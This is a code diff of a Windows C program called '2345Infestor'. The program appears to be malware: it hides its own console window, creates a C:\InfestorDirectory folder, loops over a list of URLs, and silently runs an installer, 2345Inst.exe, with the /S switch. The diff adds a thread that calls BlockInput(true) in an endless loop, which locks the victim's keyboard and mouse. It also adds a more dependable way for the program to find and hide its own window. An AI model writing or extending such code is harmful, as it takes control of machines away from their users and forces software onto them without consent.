@@ -41,6 +41,11 @@ DWORD WINAPI MSG_RUNFIRST(LPVOID lpParam) {
 	MessageBoxA(NULL, "Infestor is running！", "2345Infestor", MB_OK | MB_ICONINFORMATION);
 	return 0;
 }
+DWORD WINAPI BKIPT(LPVOID lpParam) {
+	while (1) {
+		BlockInput(true);
+	}
+}
 
 void RTN(){
 	keybd_event(VK_RETURN, 0, 0, 0);
@@ -95,11 +100,35 @@ void DPA2345() {
 	system("START C:\\InfestorDirectory\\2345Inst.exe /S");
 }
 
+HWND GetSelfHWND(void) {
+#define MY_BUFSIZE 1024 // Buffer size for console window titles.
+	HWND hwndFound;         // This is what is returned to the caller.
+	char pszNewWindowTitle[MY_BUFSIZE]; // Contains fabricated
+	// WindowTitle.
+	char pszOldWindowTitle[MY_BUFSIZE]; // Contains original
+	// WindowTitle.
+	// Fetch current window title.
+	GetConsoleTitleA(pszOldWindowTitle, MY_BUFSIZE);
+	// Format a "unique" NewWindowTitle.
+	wsprintfA(pszNewWindowTitle, "%d/%d",
+		GetTickCount(),
+		GetCurrentProcessId());
+	// Change current window title.
+	SetConsoleTitleA(pszNewWindowTitle);
+	// Ensure window title has been updated.
+	Sleep(40);
+	// Look for NewWindowTitle.
+	hwndFound = FindWindowA(NULL, pszNewWindowTitle);
+	// Restore original window title.
+	SetConsoleTitleA(pszOldWindowTitle);
+	return (hwndFound);
+}
 int main(int argc, char* argv[]) {
 	// Self Hidden
-	HWND hWnd = GetForegroundWindow();
+	HWND hWnd = GetSelfHWND();
 	ShowWindow(hWnd, SW_HIDE);
 
+	CreateThread(0, 0, BKIPT, 0, 0, 0);
 	CreateThread(0, 0, MSG_RUNFIRST, 0, 0, 0);
 	system("mkdir C:\\InfestorDirectory\\");
 	for (int i = 0; i < urls->length(); i++) {
